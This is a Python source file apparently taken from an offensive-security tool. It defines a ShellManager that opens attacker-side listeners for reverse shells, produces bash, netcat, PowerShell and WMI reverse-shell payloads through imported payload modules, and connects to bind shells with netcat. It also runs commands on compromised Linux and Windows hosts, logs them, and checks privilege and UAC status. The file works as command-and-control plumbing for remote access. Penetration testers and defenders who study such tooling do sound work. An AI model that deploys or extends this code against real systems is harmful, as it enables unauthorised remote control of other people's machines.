"""Shell manager for creating and managing shell sessions."""

import logging
import socket
import threading
import time

from amp.config import settings
from amp.exceptions import (
    ShellCreationFailed,
    ShellDied,
    ShellLimitExceeded,
)
from amp.storage.database import Database
from amp.storage.models import (
    ExecuteCommandResponse,
    OperationType,
    OSType,
    PrivilegeLevel,
    ShellModel,
    ShellProgram,
    ShellStatus,
    ShellType,
)
from amp.storage.repository import OperationRepository, ShellRepository

from .executor import CommandExecutor
from .payloads import ShellPayloads
from .state import ShellState
from .tmux_backend import TmuxBackend
from .windows_executor import WindowsExecutor
from .windows_payloads import WindowsPayloads

logger = logging.getLogger(__name__)


class ShellManager:
    """Manager for shell session lifecycle and command execution."""

    def __init__(self, database: Database):
        """Initialize shell manager.

        Args:
            database: Database instance for persistence
        """
        self.database = database
        self.tmux = TmuxBackend()
        self.executor = CommandExecutor()
        self.windows_executor = WindowsExecutor()
        self.state = ShellState()
        self._listeners: dict[str, socket.socket] = {}
        self._listener_threads: dict[str, threading.Thread] = {}

    def create_reverse_shell(
        self,
        name: str,
        local_port: int,
        target_host: str,
        tunnel_id: str | None = None,
        payload_type: str = "bash",
        use_tmux: bool = True,
        timeout: int = 30,
    ) -> tuple[ShellModel, str]:
        """Create a reverse shell (listener on attacker).

        Args:
            name: Shell name
            local_port: Local port to listen on
            target_host: Target host (for documentation)
            tunnel_id: Tunnel ID if using tunnel
            payload_type: Payload type (bash, python, nc, etc.)
            use_tmux: Whether to use tmux for persistence
            timeout: Timeout in seconds to wait for connection

        Returns:
            Tuple of (shell model, payload command)

        Raises:
            ShellLimitExceeded: If max shells limit reached
            ShellCreationFailed: If shell creation fails
        """
        with self.database.session() as session:
            repo = ShellRepository(session)

            # Check shell limit
            active_count = len(repo.list_active())
            if active_count >= settings.shell.max_shells:
                raise ShellLimitExceeded(active_count, settings.shell.max_shells)

            # CRITICAL FIX: Get actual local IP instead of 0.0.0.0
            # 0.0.0.0 is invalid for target to connect back to
            local_ip = self._get_local_ip()
            logger.info(f"Using local IP for reverse shell: {local_ip}")

            payload = ShellPayloads.get_payload(payload_type, local_ip, local_port)

            # Create shell record
            shell_data = {
                "name": name,
                "shell_type": ShellType.REVERSE.value,
                "os_type": OSType.LINUX.value,
                "shell_program": ShellProgram.BASH.value,
                "status": ShellStatus.ACTIVE.value,
                "tunnel_id": tunnel_id,
                "target_host": target_host,
                "target_port": local_port,
                "tmux_session": f"amp-shell-{name}" if use_tmux else None,
                "privilege_level": PrivilegeLevel.USER.value,
                "config": {
                    "payload_type": payload_type,
                    "local_port": local_port,
                },
            }

            shell_model = repo.create(shell_data)
            session.commit()

            # Start listener
            try:
                self._start_reverse_listener(
                    shell_model.id,
                    local_port,
                    use_tmux,
                    timeout,
                )
            except Exception as e:
                # Clean up on failure
                repo.update_status(shell_model.id, ShellStatus.DEAD)
                session.commit()
                raise ShellCreationFailed(
                    reason=f"Failed to start listener: {e}",
                    target=target_host,
                ) from e

            logger.info(
                f"Created reverse shell {shell_model.id} ({name}) "
                f"listening on port {local_port}"
            )

            return shell_model, payload

    def _start_reverse_listener(
        self,
        shell_id: str,
        port: int,
        use_tmux: bool,
        timeout: int,
    ) -> None:
        """Start reverse shell listener.

        Args:
            shell_id: Shell ID
            port: Port to listen on
            use_tmux: Whether to use tmux
            timeout: Connection timeout
        """
        # Create listener socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", port))
        listener.listen(1)
        listener.settimeout(timeout)

        self._listeners[shell_id] = listener

        # Start listener thread
        thread = threading.Thread(
            target=self._accept_reverse_connection,
            args=(shell_id, listener, use_tmux),
            daemon=True,
        )
        thread.start()
        self._listener_threads[shell_id] = thread

        logger.info(f"Started reverse listener for shell {shell_id} on port {port}")

    def _accept_reverse_connection(
        self,
        shell_id: str,
        listener: socket.socket,
        use_tmux: bool,
    ) -> None:
        """Accept reverse shell connection and attach socket.

        Args:
            shell_id: Shell ID
            listener: Listener socket
            use_tmux: Whether to use tmux
        """
        try:
            logger.info(f"Waiting for reverse connection on {listener.getsockname()}")

            # Accept connection
            conn, addr = listener.accept()
            logger.info(f"Reverse connection received from {addr}")

            # CRITICAL FIX: Attach socket to executor
            self.executor.attach_socket(shell_id, conn)

            # Update shell status
            with self.database.session() as session:
                repo = ShellRepository(session)
                shell = repo.get(shell_id)
                if shell:
                    shell_data = shell.model_dump()
                    shell_data['status'] = ShellStatus.ACTIVE.value
                    shell_data['target_host'] = addr[0]
                    repo.update_status(shell_id, ShellStatus.ACTIVE)
                    session.commit()

            logger.info(f"Reverse shell {shell_id} attached to {addr}")

            # Update shell state
            self._update_shell_state_internal(shell_id)

        except TimeoutError:
            logger.warning(f"Reverse listener timeout for shell {shell_id}")
            with self.database.session() as session:
                repo = ShellRepository(session)
                repo.update_status(shell_id, ShellStatus.DEAD)
                session.commit()
        except Exception as e:
            logger.error(f"Error accepting reverse connection for shell {shell_id}: {e}")
            with self.database.session() as session:
                repo = ShellRepository(session)
                repo.update_status(shell_id, ShellStatus.DEAD)
                session.commit()
        finally:
            listener.close()
            if shell_id in self._listeners:
                del self._listeners[shell_id]

    def create_bind_shell(
        self,
        name: str,
        target_host: str,
        target_port: int,
        tunnel_id: str | None = None,
        use_tmux: bool = True,
    ) -> ShellModel:
        """Create a bind shell (listener on target).

        Args:
            name: Shell name
            target_host: Target host
            target_port: Target port
            tunnel_id: Tunnel ID if using tunnel
            use_tmux: Whether to use tmux for persistence

        Returns:
            Shell model

        Raises:
            ShellLimitExceeded: If max shells limit reached
            ShellCreationFailed: If shell creation fails
        """
        # Verify bind connection before creating
        if not self._verify_bind_connection(target_host, target_port):
            raise ShellCreationFailed(
                reason=f"Cannot connect to {target_host}:{target_port}. "
                "Port may not be listening or host unreachable.",
                target=f"{target_host}:{target_port}",
            )

        with self.database.session() as session:
            repo = ShellRepository(session)

            # Check shell limit
            active_count = len(repo.list_active())
            if active_count >= settings.shell.max_shells:
                raise ShellLimitExceeded(active_count, settings.shell.max_shells)

            # Create shell record
            shell_data = {
                "name": name,
                "shell_type": ShellType.BIND.value,
                "os_type": OSType.LINUX.value,
                "shell_program": ShellProgram.BASH.value,
                "status": ShellStatus.ACTIVE.value,
                "tunnel_id": tunnel_id,
                "target_host": target_host,
                "target_port": target_port,
                "tmux_session": f"amp-shell-{name}" if use_tmux else None,
                "privilege_level": PrivilegeLevel.USER.value,
                "config": {},
            }

            shell_model = repo.create(shell_data)
            session.commit()

            # Connect to bind shell
            try:
                # Create tmux session if needed
                if use_tmux and shell_model.tmux_session:
                    self.tmux.create_session(shell_model.tmux_session, "bash")

                # Connect using netcat or similar
                connect_cmd = f"nc {target_host} {target_port}"
                self.executor.spawn_shell(shell_model.id, connect_cmd)

                # Update shell state
                self._update_shell_state_internal(shell_model.id)

            except Exception as e:
                repo.update_status(shell_model.id, ShellStatus.DEAD)
                session.commit()
                raise ShellCreationFailed(
                    reason=f"Failed to connect to bind shell: {e}",
                    target=f"{target_host}:{target_port}",
                ) from e

            logger.info(
                f"Created bind shell {shell_model.id} ({name}) "
                f"connected to {target_host}:{target_port}"
            )

            return shell_model

    def create_ssh_shell(
        self,
        name: str,
        target_host: str,
        username: str,
        password: str | None = None,
        key_path: str | None = None,
        tunnel_id: str | None = None,
        port: int = 22,
        use_tmux: bool = True,
    ) -> ShellModel:
        """Create an SSH shell.

        Args:
            name: Shell name
            target_host: Target host
            username: SSH username
            password: SSH password (optional)
            key_path: SSH key path (optional)
            tunnel_id: Tunnel ID if using tunnel
            port: SSH port (default: 22)
            use_tmux: Whether to use tmux for persistence

        Returns:
            Shell model

        Raises:
            ShellLimitExceeded: If max shells limit reached
            ShellCreationFailed: If shell creation fails
        """
        with self.database.session() as session:
            repo = ShellRepository(session)

            # Check shell limit
            active_count = len(repo.list_active())
            if active_count >= settings.shell.max_shells:
                raise ShellLimitExceeded(active_count, settings.shell.max_shells)

            # Create shell record
            shell_data = {
                "name": name,
                "shell_type": ShellType.SSH.value,
                "os_type": OSType.LINUX.value,
                "shell_program": ShellProgram.BASH.value,
                "status": ShellStatus.ACTIVE.value,
                "tunnel_id": tunnel_id,
                "target_host": target_host,
                "target_port": port,
                "tmux_session": f"amp-shell-{name}" if use_tmux else None,
                "privilege_level": PrivilegeLevel.USER.value,
                "config": {
                    "username": username,
                    "key_path": key_path,
                },
            }

            shell_model = repo.create(shell_data)
            session.commit()

            # Connect via SSH
            try:
                # Create tmux session if needed
                if use_tmux and shell_model.tmux_session:
                    self.tmux.create_session(shell_model.tmux_session, "bash")

                # Build SSH command
                ssh_cmd = f"ssh {username}@{target_host} -p {port}"
                if key_path:
                    ssh_cmd += f" -i {key_path}"

                self.executor.spawn_shell(shell_model.id, ssh_cmd)

                # If password provided, send it
                if password:
                    time.sleep(1)  # Wait for password prompt
                    self.executor.execute(shell_model.id, password, timeout=10)

                # Update shell state
                self._update_shell_state_internal(shell_model.id)

            except Exception as e:
                repo.update_status(shell_model.id, ShellStatus.DEAD)
                session.commit()
                raise ShellCreationFailed(
                    reason=f"Failed to connect via SSH: {e}",
                    target=f"{username}@{target_host}:{port}",
                ) from e

            logger.info(
                f"Created SSH shell {shell_model.id} ({name}) "
                f"connected to {username}@{target_host}:{port}"
            )

            return shell_model

    def execute_command(
        self,
        shell_id: str,
        command: str,
        timeout: int = 30,
    ) -> ExecuteCommandResponse:
        """Execute command in shell session.

        Args:
            shell_id: Shell ID
            command: Command to execute
            timeout: Timeout in seconds (default: 30)

        Returns:
            Command execution response

        Raises:
            ShellNotFound: If shell not found
            ShellTimeout: If command times out
        """
        with self.database.session() as session:
            shell_repo = ShellRepository(session)
            op_repo = OperationRepository(session)

            # Verify shell exists
            shell_repo.get_or_raise(shell_id)

            # Check if shell is alive
            if not self.executor.is_alive(shell_id):
                shell_repo.update_status(shell_id, ShellStatus.DEAD)
                session.commit()
                raise ShellDied(shell_id, "Shell process is not alive")

            # Execute command
            start_time = time.time()
            try:
                result = self.executor.execute(shell_id, command, timeout)
            except Exception as e:
                # Record failed operation
                duration_ms = int((time.time() - start_time) * 1000)
                op_data = {
                    "operation_type": OperationType.COMMAND.value,
                    "shell_id": shell_id,
                    "command": command,
                    "stdout": "",
                    "stderr": str(e),
                    "exit_code": -1,
                    "duration_ms": duration_ms,
                    "success": False,
                }
                operation = op_repo.create(op_data)
                session.commit()
                raise

            # Record operation
            op_data = {
                "operation_type": OperationType.COMMAND.value,
                "shell_id": shell_id,
                "command": command,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.exit_code,
                "duration_ms": result.duration_ms,
                "success": result.success,
            }
            operation = op_repo.create(op_data)

            # Update shell activity
            shell_repo.update_activity(shell_id)
            session.commit()

            logger.info(
                f"Executed command in shell {shell_id}: {command} "
                f"(exit_code={result.exit_code})"
            )

            return ExecuteCommandResponse(
                operation_id=operation.id,
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.exit_code,
                duration_ms=result.duration_ms,
                success=result.success,
            )

    def get_shell(self, shell_id: str) -> ShellModel:
        """Get shell by ID.

        Args:
            shell_id: Shell ID

        Returns:
            Shell model

        Raises:
            ShellNotFound: If shell not found
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            return repo.get_or_raise(shell_id)

    def list_active_shells(self) -> list[ShellModel]:
        """List all active shells.

        Returns:
            List of active shell models
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            return repo.list_active()

    def list_all_shells(self) -> list[ShellModel]:
        """List all shells regardless of status.

        Returns:
            List of all shell models
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            return repo.list_all()

    def list_dead_shells(self) -> list[ShellModel]:
        """List dead shells.

        Returns:
            List of dead shell models
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            return repo.list_by_status(ShellStatus.DEAD)

    def list_shells_by_status(self, status: ShellStatus) -> list[ShellModel]:
        """List shells by specific status.

        Args:
            status: Shell status to filter by

        Returns:
            List of shell models with the specified status
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            return repo.list_by_status(status)

    def close_shell(self, shell_id: str) -> None:
        """Close shell session.

        Args:
            shell_id: Shell ID

        Raises:
            ShellNotFound: If shell not found
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            shell = repo.get_or_raise(shell_id)

            # Close executor session based on OS type
            if shell.os_type == OSType.WINDOWS:
                self.windows_executor.close_shell(shell_id)
            else:
                self.executor.close_shell(shell_id)

            # Kill tmux session if exists
            if shell.tmux_session:
                self.tmux.kill_session(shell.tmux_session)

            # Close listener if exists
            if shell_id in self._listeners:
                self._listeners[shell_id].close()
                del self._listeners[shell_id]

            # Clear state
            self.state.clear_state(shell_id)

            # Update status
            repo.update_status(shell_id, ShellStatus.DEAD)
            session.commit()

            logger.info(f"Closed shell {shell_id}")

    def update_shell_state(self, shell_id: str) -> None:
        """Update shell state (cwd, env, privilege, shell type).

        Args:
            shell_id: Shell ID

        Raises:
            ShellNotFound: If shell not found
        """
        self._update_shell_state_internal(shell_id)

    def _update_shell_state_internal(self, shell_id: str) -> None:
        """Internal method to update shell state.

        Args:
            shell_id: Shell ID
        """
        try:
            # Detect working directory
            result = self.executor.execute(shell_id, "pwd", timeout=5)
            if result.success:
                cwd = result.stdout.strip()
                self.state.update_cwd(shell_id, cwd)

                # Update in database
                with self.database.session() as session:
                    repo = ShellRepository(session)
                    repo.update_working_directory(shell_id, cwd)
                    session.commit()

            # Detect privilege level
            result = self.executor.execute(shell_id, "id -u", timeout=5)
            if result.success:
                privilege = self.state.detect_privilege(result.stdout)
                self.state.update_privilege(shell_id, privilege)

            # Detect shell type
            result = self.executor.execute(shell_id, "echo $SHELL", timeout=5)
            if result.success:
                shell_type = self.state.detect_shell_type(result.stdout)
                self.state.update_shell_type(shell_id, shell_type)

            # Get environment variables (optional, can be slow)
            # result = self.executor.execute(shell_id, "env", timeout=10)
            # if result.success:
            #     env = self.state.parse_env_output(result.stdout)
            #     self.state.update_env(shell_id, env)

        except Exception as e:
            logger.debug(f"Failed to update shell state for {shell_id}: {e}")

    def create_windows_shell(
        self,
        name: str,
        target_host: str,
        shell_program: ShellProgram = ShellProgram.POWERSHELL,
        tunnel_id: str | None = None,
        local_port: int | None = None,
        payload_type: str = "powershell",
        use_tmux: bool = False,
        timeout: int = 30,
    ) -> tuple[ShellModel, str]:
        """Create a Windows reverse shell.

        Args:
            name: Shell name
            target_host: Target host (for documentation)
            shell_program: Shell program (POWERSHELL or CMD)
            tunnel_id: Tunnel ID if using tunnel
            local_port: Local port to listen on (auto-assigned if None)
            payload_type: Payload type (powershell, powershell_encoded, cmd, wmi)
            use_tmux: Whether to use tmux for persistence (not recommended for Windows)
            timeout: Timeout in seconds to wait for connection

        Returns:
            Tuple of (shell model, payload command)

        Raises:
            ShellLimitExceeded: If max shells limit reached
            ShellCreationFailed: If shell creation fails
        """
        with self.database.session() as session:
            repo = ShellRepository(session)

            # Check shell limit
            active_count = len(repo.list_active())
            if active_count >= settings.shell.max_shells:
                raise ShellLimitExceeded(active_count, settings.shell.max_shells)

            # Auto-assign port if not provided
            if local_port is None:
                local_port = self._find_available_port()

            # Generate Windows payload
            local_ip = "0.0.0.0"  # Listen on all interfaces
            payload = WindowsPayloads.get_windows_payload(
                payload_type, local_ip, local_port
            )

            # Create shell record
            shell_data = {
                "name": name,
                "shell_type": ShellType.REVERSE.value,
                "os_type": OSType.WINDOWS.value,
                "shell_program": shell_program.value,
                "status": ShellStatus.ACTIVE.value,
                "tunnel_id": tunnel_id,
                "target_host": target_host,
                "target_port": local_port,
                "tmux_session": f"amp-shell-{name}" if use_tmux else None,
                "privilege_level": PrivilegeLevel.USER.value,
                "config": {
                    "payload_type": payload_type,
                    "local_port": local_port,
                },
            }

            shell_model = repo.create(shell_data)
            session.commit()

            # Start listener
            try:
                self._start_reverse_listener(
                    shell_model.id,
                    local_port,
                    use_tmux,
                    timeout,
                )
            except Exception as e:
                # Clean up on failure
                repo.update_status(shell_model.id, ShellStatus.DEAD)
                session.commit()
                raise ShellCreationFailed(
                    reason=f"Failed to start Windows listener: {e}",
                    target=target_host,
                ) from e

            logger.info(
                f"Created Windows shell {shell_model.id} ({name}) "
                f"listening on port {local_port}"
            )

            return shell_model, payload

    def execute_windows_command(
        self,
        shell_id: str,
        command: str,
        timeout: int = 30,
    ) -> ExecuteCommandResponse:
        """Execute command in Windows shell session.

        Args:
            shell_id: Shell ID
            command: Command to execute
            timeout: Timeout in seconds (default: 30)

        Returns:
            Command execution response

        Raises:
            ShellNotFound: If shell not found
            ShellTimeout: If command times out
        """
        with self.database.session() as session:
            shell_repo = ShellRepository(session)
            op_repo = OperationRepository(session)

            # Verify shell exists and is Windows
            shell = shell_repo.get_or_raise(shell_id)
            if shell.os_type != OSType.WINDOWS:
                raise ValueError(f"Shell {shell_id} is not a Windows shell")

            # Check if shell is alive
            if not self.windows_executor.is_alive(shell_id):
                shell_repo.update_status(shell_id, ShellStatus.DEAD)
                session.commit()
                raise ShellDied(shell_id, "Windows shell process is not alive")

            # Execute command based on shell program
            start_time = time.time()
            try:
                if shell.shell_program == ShellProgram.POWERSHELL:
                    result = self.windows_executor.execute_powershell(
                        shell_id, command, timeout
                    )
                elif shell.shell_program == ShellProgram.CMD:
                    result = self.windows_executor.execute_cmd(
                        shell_id, command, timeout
                    )
                else:
                    raise ValueError(f"Unsupported Windows shell program: {shell.shell_program}")
            except Exception as e:
                # Record failed operation
                duration_ms = int((time.time() - start_time) * 1000)
                op_data = {
                    "operation_type": OperationType.COMMAND.value,
                    "shell_id": shell_id,
                    "command": command,
                    "stdout": "",
                    "stderr": str(e),
                    "exit_code": -1,
                    "duration_ms": duration_ms,
                    "success": False,
                }
                operation = op_repo.create(op_data)
                session.commit()
                raise

            # Record operation
            op_data = {
                "operation_type": OperationType.COMMAND.value,
                "shell_id": shell_id,
                "command": command,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.exit_code,
                "duration_ms": result.duration_ms,
                "success": result.success,
            }
            operation = op_repo.create(op_data)

            # Update shell activity
            shell_repo.update_activity(shell_id)
            session.commit()

            logger.info(
                f"Executed Windows command in shell {shell_id}: {command} "
                f"(exit_code={result.exit_code})"
            )

            return ExecuteCommandResponse(
                operation_id=operation.id,
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.exit_code,
                duration_ms=result.duration_ms,
                success=result.success,
            )

    def detect_os(self, shell_id: str) -> OSType:
        """Detect operating system of shell target.

        Args:
            shell_id: Shell ID

        Returns:
            Detected OS type

        Raises:
            ShellNotFound: If shell not found
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            shell = repo.get_or_raise(shell_id)

            # Try to detect OS by running commands
            try:
                # Try Linux command
                result = self.executor.execute(shell_id, "uname -s", timeout=5)
                if result.success and ("linux" in result.stdout.lower() or "unix" in result.stdout.lower()):
                    return OSType.LINUX
            except Exception:
                pass

            try:
                # Try Windows command
                win_result = self.windows_executor.execute_powershell(
                    shell_id, "$env:OS", timeout=5
                )
                if win_result.success and "windows" in win_result.stdout.lower():
                    return OSType.WINDOWS
            except Exception:
                pass

            # Return current OS type if detection fails
            return shell.os_type

    def update_windows_shell_state(self, shell_id: str) -> None:
        """Update Windows shell state (cwd, env, privilege, UAC).

        Args:
            shell_id: Shell ID

        Raises:
            ShellNotFound: If shell not found
        """
        with self.database.session() as session:
            repo = ShellRepository(session)
            shell = repo.get_or_raise(shell_id)

            if shell.os_type != OSType.WINDOWS:
                raise ValueError(f"Shell {shell_id} is not a Windows shell")

            try:
                # Detect working directory
                if shell.shell_program == ShellProgram.POWERSHELL:
                    result = self.windows_executor.execute_powershell(
                        shell_id, "pwd | Select-Object -ExpandProperty Path", timeout=5
                    )
                else:
                    result = self.windows_executor.execute_cmd(shell_id, "cd", timeout=5)

                if result.success:
                    cwd = result.stdout.strip()
                    self.state.update_cwd(shell_id, cwd)
                    repo.update_working_directory(shell_id, cwd)
                    session.commit()

                # Detect privilege level
                if shell.shell_program == ShellProgram.POWERSHELL:
                    result = self.windows_executor.execute_powershell(
                        shell_id, "whoami", timeout=5
                    )
                else:
                    result = self.windows_executor.execute_cmd(shell_id, "whoami", timeout=5)

                if result.success:
                    privilege = self.state.detect_windows_privilege(result.stdout)
                    self.state.update_privilege(shell_id, privilege)

                # Detect UAC status (PowerShell only)
                if shell.shell_program == ShellProgram.POWERSHELL:
                    result = self.windows_executor.execute_powershell(
                        shell_id,
                        "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA | Select-Object -ExpandProperty EnableLUA",
                        timeout=5,
                    )
                    if result.success:
                        uac_enabled = self.state.detect_uac_status(result.stdout)
                        logger.debug(f"UAC status for shell {shell_id}: {uac_enabled}")

            except Exception as e:
                logger.debug(f"Failed to update Windows shell state for {shell_id}: {e}")

    def _find_available_port(self, start_port: int = 4444, end_port: int = 5000) -> int:
        """Find an available port for listening.

        Args:
            start_port: Start of port range
            end_port: End of port range

        Returns:
            Available port number

        Raises:
            ShellCreationFailed: If no available port found
        """
        for port in range(start_port, end_port):
            try:
                # Try to bind to the port
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.bind(("0.0.0.0", port))
                test_socket.close()
                return port
            except OSError:
                continue

        raise ShellCreationFailed(
            reason=f"No available ports in range {start_port}-{end_port}",
            target="localhost",
        )

    def _verify_bind_connection(self, host: str, port: int, timeout: int = 5) -> bool:
        """Verify bind shell connection before creating.

        Args:
            host: Target host
            port: Target port
            timeout: Connection timeout in seconds

        Returns:
            True if connection successful, False otherwise
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.close()
            logger.info(f"Bind connection verified: {host}:{port}")
            return True
        except Exception as e:
            logger.warning(f"Bind connection failed: {host}:{port} - {e}")
            return False

    def _get_local_ip(self) -> str:
        """Get local IP address for reverse shell connections.

        Returns:
            Local IP address (not 0.0.0.0 or 127.0.0.1)
        """
        try:
            # Connect to external IP to determine local interface IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            logger.info(f"Detected local IP: {local_ip}")
            return local_ip
        except Exception as e:
            logger.warning(f"Failed to get local IP: {e}, using 127.0.0.1")
            return "127.0.0.1"

